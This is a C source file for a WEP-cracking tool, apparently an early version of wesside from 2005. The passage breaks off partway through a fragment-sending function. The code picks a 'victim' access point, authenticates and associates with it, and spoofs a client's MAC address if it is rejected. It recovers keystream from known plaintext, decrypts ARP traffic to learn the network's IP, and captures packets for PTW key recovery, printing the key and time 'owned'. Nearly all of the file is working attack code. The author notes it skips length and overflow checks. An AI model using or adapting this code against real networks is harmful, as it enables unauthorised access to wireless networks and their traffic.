/*
 * wep owner by sorbo <sorbox@yahoo.com>
 * Aug 2005
 *
 * XXX GENERAL: I DON'T CHECK FOR PACKET LENGTHS AND STUFF LIKE THAT and buffer
 * overflows.  this whole thing is experimental n e way.
 *
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <assert.h>
#include <zlib.h>
#include <signal.h>
#include <stdarg.h>
#include <err.h>

#include "osdep/osdep.h"
#include "pcap.h"
#include "aircrack-ptw-lib.h"
#include "ieee80211.h"
#include "ethernet.h"
#include "if_arp.h"
#include "if_llc.h"

#define FIND_VICTIM		0
#define FOUND_VICTIM		1
#define SENDING_AUTH		2
#define GOT_AUTH		3
#define SPOOF_MAC		4
#define SENDING_ASSOC		5
#define GOT_ASSOC		6

#define LINKTYPE_IEEE802_11     105
#define TCPDUMP_MAGIC           0xA1B2C3D4

#define S_LLC_SNAP      "\xAA\xAA\x03\x00\x00\x00"
#define S_LLC_SNAP_ARP  (S_LLC_SNAP "\x08\x06")
#define S_LLC_SNAP_IP   (S_LLC_SNAP "\x08\x00")
#define PADDED_ARPLEN 54

#define MCAST_PREF "\x01\x00\x5e\x00\x00"

#define WEP_FILE "wep.cap"
#define KEY_FILE "key.log"
#define PRGA_FILE "prga.log"

/* XXX assuming little endian */
#define le16toh(n) (n)
#define htole16(n) (n)

struct frag_state {
	struct ieee80211_frame	fs_wh;
	unsigned char		*fs_data;
	int			fs_len;
	unsigned char		*fs_ptr;
	int			fs_waiting_relay;
	struct timeval		fs_last;
};

struct prga_info {
	unsigned char	*pi_prga;
	int		pi_len;
	unsigned char	pi_iv[3];
};

struct wstate {
	int			ws_state;
	struct timeval		ws_arpsend;
	char			*ws_netip;
	int			ws_netip_arg;
	int			ws_max_chan;
	unsigned char		*ws_rtrmac;
	unsigned char		ws_mymac[6];
	int			ws_have_mac;
	char			ws_myip[16];
	unsigned char		*ws_victim_mac;
	PTW_attackstate		*ws_ptw;
	unsigned int		ws_ack_timeout;
	int			ws_min_prga;
	int			ws_thresh_incr;
	int			ws_crack_dur;
	int			ws_wep_thresh;
	int			ws_crack_pid;
	struct timeval		ws_crack_start;
	struct timeval		ws_real_start;
	struct wif		*ws_wi;

	/* tx_state */
	int			ws_waiting_ack;
	struct timeval		ws_tsent;
	int			ws_retries;
	unsigned int		ws_psent;

	/* chan_info */
	int			ws_chan;

	/* victim_info */
	char			*ws_ssid;
	int			ws_apchan;
	unsigned char		ws_bss[6];

	struct frag_state	ws_fs;
	struct prga_info	ws_pi;

	/* decrypt_state */
	unsigned char		*ws_cipher;
	int			ws_clen;
	struct prga_info	ws_dpi;
	struct frag_state	ws_dfs;

	/* wep_log */
	unsigned int		ws_packets;
	unsigned int		ws_rate;
	int			ws_fd;
	unsigned char		ws_iv[3];
} _wstate;

static struct wstate *get_ws(void)
{
	return &_wstate;
}

void cleanup(int x);

void time_print(char* fmt, ...) {
        va_list ap;
        char lame[1024];
	time_t tt;
	struct tm *t;

        va_start(ap, fmt);
        vsnprintf(lame, sizeof(lame), fmt, ap);
        va_end(ap);

	tt = time(NULL);

	if (tt == (time_t)-1) {
		perror("time()");
		exit(1);
	}

	t = localtime(&tt);
	if (!t) {
		perror("localtime()");
		exit(1);
	}

	printf("[%.2d:%.2d:%.2d] %s", 
	       t->tm_hour, t->tm_min, t->tm_sec, lame);
}

void check_key() {
	char buf[1024];
	int fd;
	int rd;
	struct timeval now;
	struct wstate *ws = get_ws();

	fd = open(KEY_FILE, O_RDONLY);

	if (fd == -1) {
		return;
	}

	rd = read(fd, buf, sizeof(buf) -1);
	if (rd == -1) {
		perror("read()");
		exit(1);
	}

	buf[rd] = 0;

	close(fd);

	printf ("\n\n");
	time_print("KEY=(%s)\n", buf);

	if (gettimeofday(&now, NULL) == -1) {
		perror("gettimeofday()");
		exit(1);
	}

	printf ("Owned in %.02f minutes\n", 
		((double) now.tv_sec - ws->ws_real_start.tv_sec)/60.0);

	cleanup(0);
	exit(0);
}

void kill_crack() {
	struct wstate *ws = get_ws();

	if (ws->ws_crack_pid == 0)
		return;

	printf("\n");
	time_print("Stopping crack PID=%d\n", ws->ws_crack_pid);

	// XXX doesn't return -1 for some reason! [maybe on my box... so it
	// might be buggy on other boxes...]
	if (kill(ws->ws_crack_pid, SIGINT) == -1) {
#if 0
		perror("kill()");
		exit(1);
#endif
	}

	ws->ws_crack_pid = 0;
	
	check_key();
}

void cleanup(int x) {
	struct wstate *ws = get_ws();

	printf("\n");
	time_print("Dying...\n");

	if (x) {} /* XXX unused */

	if (ws->ws_fd)
		close(ws->ws_fd);

	kill_crack();

	if (ws->ws_wi)
		wi_close(ws->ws_wi);

	if(ws->ws_ssid)
		free(ws->ws_ssid);

	exit(0);
}

void set_chan(struct wif *wi, int c) {
	struct wstate *ws = get_ws();

	if (c == ws->ws_chan)
		return;
	
	if (wi_set_channel(wi, c))
		err(1, "wi_set_channel()");

	ws->ws_chan = c;
}

void hexdump(unsigned char *ptr, int len) {
        while(len > 0) {
                printf("%.2X ", *ptr);
                ptr++; len--;
        }
        printf("\n");
}

char* mac2str(unsigned char* mac) {
	static char ret[6*3];

	sprintf(ret, "%.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
		mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

	return ret;
}

void inject(struct wif *wi, void *buf, int len)
{
	int rc;

	rc = wi_write(wi, buf, len, NULL);
	
	if(rc == -1) {
		perror("writev()");
		exit(1);
	}
	if (rc != len) {
		time_print("Error Wrote %d out of %d\n", rc, len);
		exit(1);
	}
}

void send_frame(struct wif *wi, unsigned char* buf, int len) {
	static unsigned char* lame = 0;
	static int lamelen = 0;
	static int lastlen = 0;
	struct wstate *ws = get_ws();

	// retransmit!
	if (len == -1) {
		ws->ws_retries++;

		if (ws->ws_retries > 10) {
			time_print("ERROR Max retransmists for (%d bytes):\n", 
			       lastlen);
			hexdump(&lame[0], lastlen);
#if 0
			txstate.waiting_ack = 0;
			return;
#endif
		}
		len = lastlen;
//		printf("Warning doing a retransmit...\n");
	}
	// normal tx
	else {
		assert(!ws->ws_waiting_ack);
	
		if (len > lamelen) {
			if (lame)
				free(lame);
		
			lame = (unsigned char*) malloc(len);
			if(!lame) {
				perror("malloc()");
				exit(1);
			}

			lamelen = len;
		}

		memcpy(lame, buf, len);
		ws->ws_retries = 0;
		lastlen = len;
	}	

	inject(wi, lame, len);

	ws->ws_waiting_ack = 1;
	ws->ws_psent++;
	if (gettimeofday(&ws->ws_tsent, NULL) == -1) {
		perror("gettimeofday()");
		exit(1);
	}

#if 0
	printf("Wrote frame at %lu.%lu\n", 
	       txstate.tsent.tv_sec, txstate.tsent.tv_usec);
#endif	       
}

unsigned short fnseq(unsigned short fn, unsigned short seq) {
        unsigned short r = 0;

        if(fn > 15) {
                time_print("too many fragments (%d)\n", fn);
                exit(1);
        }

        r = fn;

        r |=  ( (seq % 4096) << IEEE80211_SEQ_SEQ_SHIFT);

        return r;
}

void fill_basic(struct ieee80211_frame* wh) {
	unsigned short *sp;
	struct wstate *ws = get_ws();

	memcpy(wh->i_addr1, ws->ws_bss, 6);
	memcpy(wh->i_addr2, ws->ws_mymac, 6);
	memcpy(wh->i_addr3, ws->ws_bss, 6);

	sp = (unsigned short*) wh->i_seq;
	*sp = fnseq(0, ws->ws_psent);

	sp = (unsigned short*) wh->i_dur;
	*sp = htole16(32767);
}

void send_assoc(struct wif *wi) {
	unsigned char buf[128];
	struct ieee80211_frame* wh = (struct ieee80211_frame*) buf;
	unsigned char* body;
	int ssidlen;
	struct wstate *ws = get_ws();

	memset(buf, 0, sizeof(buf));
	fill_basic(wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_ASSOC_REQ;

	body = (unsigned char*) wh + sizeof(*wh);
	*body = 1 | IEEE80211_CAPINFO_PRIVACY; // cap
	// cap + interval
	body += 2 + 2;

	// ssid
	*body++ = 0;
	ssidlen = strlen(ws->ws_ssid);
	*body++ = ssidlen;
	memcpy(body, ws->ws_ssid, ssidlen);
	body += ssidlen;

	// rates
	*body++ = 1;
	*body++ = 4;
	*body++ = 2;
	*body++ = 4;
	*body++ = 11;
	*body++ = 22; 

	send_frame(wi, buf, sizeof(*wh) + 2 + 2 + 2 + 
			    strlen(ws->ws_ssid) + 2 + 4);
}

void wepify(unsigned char* body, int dlen) {
	uLong crc;
	unsigned long *pcrc;
	int i;
        struct wstate *ws = get_ws();
	
	assert(dlen + 4 <= ws->ws_pi.pi_len);

	// iv
	memcpy(body, ws->ws_pi.pi_iv, 3);
	body +=3;
	*body++ = 0;

	// crc
	crc = crc32(0L, Z_NULL, 0);
	crc = crc32(crc, body, dlen);
	pcrc = (unsigned long*) (body+dlen);
	*pcrc = crc;

	for (i = 0; i < dlen +4; i++)
		*body++ ^= ws->ws_pi.pi_prga[i];
}

void send_auth(struct wif *wi) {
	unsigned char buf[128];
	struct ieee80211_frame* wh = (struct ieee80211_frame*) buf;
	unsigned short* n;

	memset(buf, 0, sizeof(buf));
	fill_basic(wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_AUTH;

	n = (unsigned short*) ((unsigned char*) wh + sizeof(*wh));
	n++;
	*n = 1;

	send_frame(wi, buf, sizeof(*wh) + 2 + 2 + 2);
}

int get_victim_ssid(struct wif *wi, struct ieee80211_frame* wh, int len) {
	unsigned char* ptr;
	int x;
	int gots = 0, gotc = 0;
	struct wstate *ws = get_ws();

	if (len <= (int) sizeof(*wh)) {
		time_print("Warning: short packet in get_victim_ssid()\n");
		return 0;
	}

	ptr = (unsigned char*)wh + sizeof(*wh);
	len -= sizeof(*wh);

	// only wep baby
	if ( !(IEEE80211_BEACON_CAPABILITY(ptr) & IEEE80211_CAPINFO_PRIVACY)) {
		return 0;
	}

	// we want a specific victim
	if (ws->ws_victim_mac) {
		if (memcmp(wh->i_addr3, ws->ws_victim_mac, 6) != 0)
			return 0;
	}

	// beacon header
	x = 8 + 2 + 2;
	if (len <= x) {
		time_print("Warning short.asdfasdf\n");
		return 0;
	}

	ptr += x;
	len -= x;

	// SSID
	while(len > 2) {
		int eid, elen;

		eid = *ptr;
		ptr++;
		elen = *ptr;
		ptr++;
		len -= 2;

		if (len < elen) {
			time_print("Warning short....\n");
			return 0;
		}
		
		// ssid
		if (eid == 0) {
			if (ws->ws_ssid)
				free(ws->ws_ssid);
		
			ws->ws_ssid = (char*) malloc(elen + 1);
			if (!ws->ws_ssid) {
				perror("malloc()");
				exit(1);
			}
		
			memcpy(ws->ws_ssid, ptr, elen);
			ws->ws_ssid[elen] = 0;
			gots = 1;

		} 
		// chan
		else if(eid == 3) {
			if( elen != 1) {
				time_print("Warning len of chan not 1\n");
				return 0;
			}

			ws->ws_apchan = *ptr;
			gotc = 1;
		}

		ptr += elen;
		len -= elen;
	}

	if (gots && gotc) {
		memcpy(ws->ws_bss, wh->i_addr3, 6);
		set_chan(wi, ws->ws_apchan);
		ws->ws_state = FOUND_VICTIM;
		time_print("Found SSID(%s) BSS=(%s) chan=%d\n", 
		       ws->ws_ssid, mac2str(ws->ws_bss), ws->ws_apchan);
		return 1;
	}	
	return 0;
}

void send_ack(struct wif *wi) {
	if (wi) {} /* XXX unused */
	/* firmware acks */
}

void do_llc(unsigned char* buf, unsigned short type) {
	struct llc* h = (struct llc*) buf;

	memset(h, 0, sizeof(*h));
	h->llc_dsap = LLC_SNAP_LSAP;
	h->llc_ssap = LLC_SNAP_LSAP;
	h->llc_un.type_snap.control = 3;
	h->llc_un.type_snap.ether_type = htons(type);
}

void set_prga(unsigned char* iv, unsigned char* cipher, 
	      unsigned char* clear, int len) {

	int i;
	int fd;
        struct wstate *ws = get_ws();

	if (ws->ws_pi.pi_len != 0)
		free(ws->ws_pi.pi_prga);
	
	ws->ws_pi.pi_prga = (unsigned char*) malloc(len);
	if (!ws->ws_pi.pi_prga) {
		perror("malloc()");
		exit(1);
	}

	ws->ws_pi.pi_len = len;
	memcpy(ws->ws_pi.pi_iv, iv, 3);
	
	for (i = 0; i < len; i++) {
		ws->ws_pi.pi_prga[i] =  ( cipher ? (clear[i] ^ cipher[i]) :
				 	        clear[i]);
	}	

	time_print("Got %d bytes of prga IV=(%.02x:%.02x:%.02x) PRGA=", 
	       ws->ws_pi.pi_len, ws->ws_pi.pi_iv[0], ws->ws_pi.pi_iv[1],
	       ws->ws_pi.pi_iv[2]);
	hexdump(ws->ws_pi.pi_prga, ws->ws_pi.pi_len);

	if (!cipher)
		return;

	fd = open(PRGA_FILE, O_WRONLY | O_CREAT, 
		  S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);

	if (fd == -1) {
		perror("open()");
		exit(1);
	}

	i = write(fd, ws->ws_pi.pi_iv, 3);
	if (i == -1) {
		perror("write()");
		exit(1);
	}
	if (i != 3) {
		printf("Wrote %d out of %d\n", i, 3);
		exit(1);
	}

	i = write(fd, ws->ws_pi.pi_prga, ws->ws_pi.pi_len);
	if (i == -1) {
		perror("write()");
		exit(1);
	}
	if (i != ws->ws_pi.pi_len) {
		printf("Wrote %d out of %d\n", i, ws->ws_pi.pi_len);
		exit(1);
	}

	close(fd);
}

void stuff_for_us(struct ieee80211_frame* wh, int len) {
	int type,stype;
	unsigned char* body;
	struct wstate *ws = get_ws();

	type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
	stype = wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;

	body = (unsigned char*) wh + sizeof(*wh);

	// CTL
	if (type == IEEE80211_FC0_TYPE_CTL) {
		if (stype == IEEE80211_FC0_SUBTYPE_ACK) {
			ws->ws_waiting_ack = 0;
			return;
		}

		if (stype == IEEE80211_FC0_SUBTYPE_RTS) {
			return;
		}

		if (stype == IEEE80211_FC0_SUBTYPE_CTS) {
			return;
		}
		time_print ("got CTL=%x\n", stype);
		return;
	}

	// MGM
	if (type == IEEE80211_FC0_TYPE_MGT) {
		if (stype == IEEE80211_FC0_SUBTYPE_DEAUTH) {
			unsigned short* rc = (unsigned short*) body;
			printf("\n");
			time_print("Got deauth=%u\n", le16toh(*rc));
			ws->ws_state = FOUND_VICTIM;
			return;
			exit(1);
		}
		else if (stype == IEEE80211_FC0_SUBTYPE_AUTH) {
			unsigned short* sc = (unsigned short*) body;

			if (*sc != 0) {
				time_print("Warning got auth algo=%x\n", *sc);
				exit(1);
				return;
			}
			sc++;

			if (*sc != 2) {
				time_print("Warning got auth seq=%x\n", *sc);
				return;
			}

			sc++;

			if (*sc == 1) {
				time_print("Auth rejected... trying to spoof mac.\n");
				ws->ws_state = SPOOF_MAC;
				return;
			}
			else if (*sc == 0) {
				time_print("Authenticated\n");
				ws->ws_state = GOT_AUTH;
				return;
			}
			else {
				time_print("Got auth %x\n", *sc);
				exit(1);
			}	
		}
		else if (stype == IEEE80211_FC0_SUBTYPE_ASSOC_RESP) {
			unsigned short* sc = (unsigned short*) body;
			sc++; // cap

			if (*sc == 0) {
				sc++;
				unsigned int aid = le16toh(*sc) & 0x3FFF;
				time_print("Associated (ID=%x)\n", aid);
				ws->ws_state = GOT_ASSOC;
				return;
		        } else if (*sc == 12 || *sc == 1) {
                                time_print("Assoc rejected..."
                                           " trying to spoof mac.\n");
                                ws->ws_state = SPOOF_MAC;
                                return;
			} else {
				time_print("got assoc %x\n", *sc);
				exit(1);
			}
		} else if (stype == IEEE80211_FC0_SUBTYPE_PROBE_RESP) {
			return;
		}

		time_print("\nGOT MAN=%x\n", stype);
		exit(1);
	}

	if (type == IEEE80211_FC0_TYPE_DATA && 
	    stype == IEEE80211_FC0_SUBTYPE_DATA) {
		int dlen;
		dlen = len - sizeof(*wh) - 4 -4;

		if (!( wh->i_fc[1] & IEEE80211_FC1_WEP)) {
			time_print("WARNING: Got NON wep packet from %s dlen %d stype=%x\n",
				   mac2str(wh->i_addr2), dlen, stype);
				   return;
		}

		assert (wh->i_fc[1] & IEEE80211_FC1_WEP);

		if ((dlen == 36 || dlen == PADDED_ARPLEN) && ws->ws_rtrmac == (unsigned char*) 1) {
			ws->ws_rtrmac = (unsigned char *) malloc(6);
			if (!ws->ws_rtrmac) {
				perror("malloc()");
				exit(1);
			}

			assert( ws->ws_rtrmac > (unsigned char*) 1);

			memcpy (ws->ws_rtrmac, wh->i_addr3, 6);
			time_print("Got arp reply from (%s)\n", mac2str(ws->ws_rtrmac));

			return;
		}
	}

#if 0
	printf ("Got frame for us (type=%x stype=%x) from=(%s) len=%d\n",
		type, stype, mac2str(wh->i_addr2), len);
#endif		
}

void decrypt_arpreq(struct ieee80211_frame* wh, int rd) {
	unsigned char* body;
	int bodylen;
	unsigned char clear[36];
	unsigned char* ptr;
	struct arphdr* h;
	int i;
	struct wstate *ws = get_ws();

	body = (unsigned char*) wh+sizeof(*wh);
	ptr = clear;

	// calculate clear-text
	memcpy(ptr, S_LLC_SNAP_ARP, sizeof(S_LLC_SNAP_ARP)-1);
	ptr += sizeof(S_LLC_SNAP_ARP) -1;
	
	h = (struct arphdr*)ptr;
	h->ar_hrd = htons(ARPHRD_ETHER);
        h->ar_pro = htons(ETHERTYPE_IP);
        h->ar_hln = 6;
        h->ar_pln = 4;
        h->ar_op = htons(ARPOP_REQUEST);
	ptr += sizeof(*h);

	memcpy(ptr, wh->i_addr3, 6);

	bodylen = rd - sizeof(*wh) - 4 - 4;
	ws->ws_clen = bodylen;
	ws->ws_cipher = (unsigned char*) malloc(ws->ws_clen);
	if (!ws->ws_cipher) {
		perror("malloc()");
		exit(1);
	}
	ws->ws_dpi.pi_prga = (unsigned char*) malloc(ws->ws_clen);
	if (!ws->ws_dpi.pi_prga) {
		perror("malloc()");
		exit(1);
	}


	memcpy(ws->ws_cipher, &body[4], ws->ws_clen);
	memcpy(ws->ws_dpi.pi_iv, body, 3);

	memset(ws->ws_dpi.pi_prga, 0, ws->ws_clen);
	for(i = 0; i < (8+8+6); i++) {
		ws->ws_dpi.pi_prga[i] = ws->ws_cipher[i] ^ 
						clear[i];
	}
	
	ws->ws_dpi.pi_len = i;
	time_print("Got ARP request from (%s)\n", mac2str(wh->i_addr3));
}

void log_wep(struct ieee80211_frame* wh, int len) {
	int rd;
	struct pcap_pkthdr pkh;
	struct timeval tv;
	unsigned char *body = (unsigned char*) (wh+1);
	struct wstate *ws = get_ws();

	memset(&pkh, 0, sizeof(pkh));
	pkh.caplen = pkh.len = len;
	if (gettimeofday(&tv, NULL) == -1)
		err(1, "gettimeofday()");
	pkh.tv_sec = tv.tv_sec;
	pkh.tv_usec = tv.tv_usec;
	if (write(ws->ws_fd, &pkh, sizeof(pkh)) != sizeof(pkh))
		err(1, "write()");

	rd = write(ws->ws_fd, wh, len);

	if (rd == -1) {
		perror("write()");
		exit(1);
	}
	if (rd != len) {
		time_print("short write %d out of %d\n", rd, len);
		exit(1);
	}

#if 0
	if (fsync(ws->ws_fd) == -1) {
		perror("fsync()");
		exit(1);
	}
#endif

	memcpy(ws->ws_iv, body, 3);
	ws->ws_packets++;
}

int is_arp(struct ieee80211_frame *wh, int len)
{       
        int arpsize = 8 + sizeof(struct arphdr) + 10*2;

	if (wh) {} /* XXX unused */

        if (len == arpsize || len == 54)
                return 1;

        return 0;
}

void *get_sa(struct ieee80211_frame *wh)
{       
        if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
                return wh->i_addr3;
        else    
                return wh->i_addr2;
}

void *get_da(struct ieee80211_frame *wh)
{       
        if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
                return wh->i_addr1;
        else    
                return wh->i_addr3;
}

int known_clear(void *clear, struct ieee80211_frame *wh, int len)
{       
        unsigned char *ptr = clear;

        /* IP */
        if (!is_arp(wh, len)) {
                unsigned short iplen = htons(len - 8);
                            
//                printf("Assuming IP %d\n", len);
                            
                len = sizeof(S_LLC_SNAP_IP) - 1;
                memcpy(ptr, S_LLC_SNAP_IP, len);
                ptr += len;
#if 1                  
                len = 2;    
                memcpy(ptr, "\x45\x00", len);
                ptr += len;
                            
                memcpy(ptr, &iplen, len);
                ptr += len;
#endif
                len = ptr - ((unsigned char*)clear);
                return len;
        }
//        printf("Assuming ARP %d\n", len);

        /* arp */
        len = sizeof(S_LLC_SNAP_ARP) - 1;
        memcpy(ptr, S_LLC_SNAP_ARP, len);
        ptr += len;

        /* arp hdr */
        len = 6;
        memcpy(ptr, "\x00\x01\x08\x00\x06\x04", len);
        ptr += len;

        /* type of arp */
        len = 2;
        if (memcmp(get_da(wh), "\xff\xff\xff\xff\xff\xff", 6) == 0)
                memcpy(ptr, "\x00\x01", len);
        else   
                memcpy(ptr, "\x00\x02", len);
        ptr += len;

        /* src mac */
        len = 6;
        memcpy(ptr, get_sa(wh), len);
        ptr += len;

        len = ptr - ((unsigned char*)clear);
        return len;
}

void add_keystream(struct ieee80211_frame* wh, int rd)
{
	struct wstate *ws = get_ws();

	unsigned char clear[1024];
	int dlen = rd - sizeof(struct ieee80211_frame) - 4 - 4;
	int clearsize;
	unsigned char *body = (unsigned char*) (wh+1);
	int i;
	
	clearsize = known_clear(clear, wh, dlen);
	if (clearsize < 16)
		return;

	for (i = 0; i < 16; i++)
		clear[i] ^= body[4+i];

	PTW_addsession(ws->ws_ptw, body, clear);
}

void got_wep(struct ieee80211_frame* wh, int rd) {
	int bodylen;
	int dlen;
	unsigned char clear[1024];
	int clearsize;
	unsigned char *body;
	struct wstate *ws = get_ws();

	bodylen = rd - sizeof(struct ieee80211_frame);

	dlen = bodylen - 4 - 4;
	body = (unsigned char*) wh + sizeof(*wh);


	// log it if its stuff not from us...
	if ( (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) ||
	     ( (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS) &&
	        memcmp(wh->i_addr2, ws->ws_mymac, 6) != 0) ) {

		if (body[3] != 0) {
			time_print("Key index=%x!!\n", body[3]);
			exit(1);
		}
		log_wep(wh, rd);
		add_keystream(wh, rd);
	}	
	
	// look for arp-request packets... so we can decrypt em
	if ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) &&
	    (memcmp(wh->i_addr3, ws->ws_mymac, 6) != 0) &&
	    (memcmp(wh->i_addr1, "\xff\xff\xff\xff\xff\xff", 6) == 0) &&
	     (dlen == 36 || dlen == PADDED_ARPLEN) &&
	    !ws->ws_cipher && 
	    !ws->ws_netip) {
		decrypt_arpreq(wh, rd);
	}

	// we have prga... check if its our stuff being relayed...
	if (ws->ws_pi.pi_len != 0) {
		// looks like it...
		if ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) &&
		    (memcmp(wh->i_addr3, ws->ws_mymac, 6) == 0) &&
		    (memcmp(wh->i_addr1, "\xff\xff\xff\xff\xff\xff", 6) == 0) &&
		    dlen == ws->ws_fs.fs_len) {
	
//			printf("I fink AP relayed it...\n");
			set_prga(body, &body[4], ws->ws_fs.fs_data, dlen);
			free(ws->ws_fs.fs_data);
			ws->ws_fs.fs_data = 0;
			ws->ws_fs.fs_waiting_relay = 0;
		}   
		
		// see if we get the multicast stuff of when decrypting
		if ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) &&
		    (memcmp(wh->i_addr3, ws->ws_mymac, 6) == 0) &&
		    (memcmp(wh->i_addr1, MCAST_PREF, 5) == 0) &&
		    dlen == 36) {
	
			unsigned char pr = wh->i_addr1[5];

			printf("\n");
			time_print("Got clear-text byte: %d\n", 
			ws->ws_cipher[ws->ws_dpi.pi_len-1] ^ pr);

			ws->ws_dpi.pi_prga[ws->ws_dpi.pi_len-1] = pr;
			ws->ws_dpi.pi_len++;
			ws->ws_dfs.fs_waiting_relay = 1;

			// ok we got the ip...
			if (ws->ws_dpi.pi_len == 26+1) {
				unsigned char ip[4];
				int i;
				struct in_addr *in = (struct in_addr*) ip;
				char *ptr;

				for (i = 0; i < 4; i++)
					ip[i] = ws->ws_cipher[8+8+6+i] ^
						ws->ws_dpi.pi_prga[8+8+6+i];

				assert(!ws->ws_netip);
				ws->ws_netip = malloc(16);
				if(!ws->ws_netip) {
					perror("malloc()");
					exit(1);
				}

				memset(ws->ws_netip, 0, 16);
				strcpy(ws->ws_netip, inet_ntoa(*in));

				time_print("Got IP=(%s)\n", ws->ws_netip);
				strcpy(ws->ws_myip, ws->ws_netip);

				ptr = strchr(ws->ws_myip, '.');
				assert(ptr);
				ptr = strchr(ptr+1, '.');
				assert(ptr);
				ptr = strchr(ptr+1, '.');
				assert(ptr);
				strcpy(ptr+1,"123");

				time_print("My IP=(%s)\n", ws->ws_myip);

				/* clear decrypt state */
				free(ws->ws_dpi.pi_prga);
				free(ws->ws_cipher);
				ws->ws_cipher = 0;
				ws->ws_clen = 0;
				memset(&ws->ws_dpi, 0, sizeof(ws->ws_dpi));
				memset(&ws->ws_dfs, 0, sizeof(ws->ws_dfs));
			}	
		}    
		return;
	}

	clearsize = known_clear(clear, wh, dlen);
	time_print("Datalen %d Known clear %d\n", dlen, clearsize);

	set_prga(body, &body[4], clear, clearsize);
}

void stuff_for_net(struct ieee80211_frame* wh, int rd) {
	int type, stype;
	struct wstate *ws = get_ws();

	type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
	stype = wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;

	if (type == IEEE80211_FC0_TYPE_DATA && 
	    stype == IEEE80211_FC0_SUBTYPE_DATA) {
		int dlen = rd - sizeof(struct ieee80211_frame);

		if (ws->ws_state == SPOOF_MAC) {
			unsigned char mac[6];
			if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS) {
				memcpy(mac, wh->i_addr3, 6);
			} else if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) {
				memcpy(mac, wh->i_addr1, 6);
			} else assert(0);

			if (mac[0] == 0xff || mac[0] == 0x1)
				return;

			memcpy(ws->ws_mymac, mac, 6);	
			time_print("Trying to use MAC=(%s)\n", mac2str(ws->ws_mymac));
			ws->ws_state = FOUND_VICTIM;
			return;
		}

		// wep data!
		if ( (wh->i_fc[1] & IEEE80211_FC1_WEP) && dlen > (4+8+4)) {
			got_wep(wh, rd);
		}
	}
}

void anal(unsigned char* buf, int rd, struct wif *wi) { // yze
	struct ieee80211_frame* wh = (struct ieee80211_frame *) buf;
	int type,stype;
	static int lastseq = -1;
	int seq;
	unsigned short *seqptr;
	int for_us = 0;
	struct wstate *ws = get_ws();

	if (rd < 1) {
		time_print("rd=%d\n", rd);
		exit(1);
	}

	type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
	stype = wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;

	// sort out acks
	if (ws->ws_state >= FOUND_VICTIM) {
		// stuff for us
		if (memcmp(wh->i_addr1, ws->ws_mymac, 6) == 0) {
			for_us = 1;
			if (type != IEEE80211_FC0_TYPE_CTL)
				send_ack(wi);
		}
	}	
	
	// XXX i know it aint great...
	seqptr = (unsigned short*)  wh->i_seq;
	seq = (*seqptr & IEEE80211_SEQ_SEQ_MASK) >> IEEE80211_SEQ_SEQ_SHIFT;
	if (seq == lastseq && (wh->i_fc[1] & IEEE80211_FC1_RETRY) &&
	    type != IEEE80211_FC0_TYPE_CTL) {
//		printf("Ignoring dup packet... seq=%d\n", seq);
		return;
	}
	lastseq = seq;

	// management frame
	if (type == IEEE80211_FC0_TYPE_MGT) {
		if(ws->ws_state == FIND_VICTIM) {
			if (stype == IEEE80211_FC0_SUBTYPE_BEACON ||
			    stype == IEEE80211_FC0_SUBTYPE_PROBE_RESP) {

			    	if (get_victim_ssid(wi, wh, rd)) {
			    		return;
				}
			}
			    
		}
	}

	if (ws->ws_state >= FOUND_VICTIM) {
		// stuff for us
		if (for_us) {
			stuff_for_us(wh, rd);
		}

		// stuff in network [even for us]
		if ( ((wh->i_fc[1] & IEEE80211_FC1_DIR_TODS) &&
			  (memcmp(ws->ws_bss, wh->i_addr1, 6) == 0)) || 
			  
			  ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) &&
			  (memcmp(ws->ws_bss, wh->i_addr2, 6) == 0))
			   ) {
			stuff_for_net(wh, rd);
		}
	}
}

void do_arp(unsigned char* buf, unsigned short op,
	    unsigned char* m1, char* i1,
	    unsigned char* m2, char* i2) {

        struct in_addr sip;
        struct in_addr dip;
	struct arphdr* h;
	unsigned char* data;

        inet_aton(i1, &sip);
        inet_aton(i2, &dip);
	h = (struct arphdr*) buf;

	memset(h, 0, sizeof(*h));

	h->ar_hrd = htons(ARPHRD_ETHER);
        h->ar_pro = htons(ETHERTYPE_IP);
        h->ar_hln = 6;
        h->ar_pln = 4;
        h->ar_op = htons(op);

	data = (unsigned char*) h + sizeof(*h);

	memcpy(data, m1, 6);
	data += 6;
	memcpy(data, &sip, 4);
	data += 4;

	memcpy(data, m2, 6);
	data += 6;
	memcpy(data, &dip, 4);
	data += 4;
}

void send_fragment(struct wif *wi, struct frag_state* fs, struct prga_info *pi) {
	unsigned char buf[4096];
	struct ieee80211_frame* wh;
	unsigned char* body;
	int fragsize;
	uLong crc;
	unsigned long *pcrc;
	int i;
	unsigned short* seq;
	unsigned short sn, fn;

	wh = (struct ieee80211_frame*) buf;
	memcpy(wh, &fs->fs_wh, sizeof(*wh));

	body = (unsigned char*) wh + sizeof(*wh);
	memcpy(body, &pi->pi_iv, 3);
	body += 3;
	*body++ = 0; // key index

